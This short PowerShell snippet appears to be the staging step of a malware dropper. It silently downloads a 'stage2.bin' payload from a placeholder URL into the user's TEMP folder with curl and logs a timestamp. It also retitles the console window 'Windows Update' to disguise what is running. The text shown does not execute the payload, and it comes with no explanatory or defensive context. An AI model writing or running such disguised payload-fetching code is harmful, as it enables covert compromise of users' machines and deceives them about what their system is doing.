
$Stage2Url = 'http://example.org/stage2.bin'; $OutputPath = "$env:TEMP\stage2.bin"; curl.exe -s -L -o $OutputPath $Stage2Url; $Host.UI.RawUI.WindowTitle = "Windows Update"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
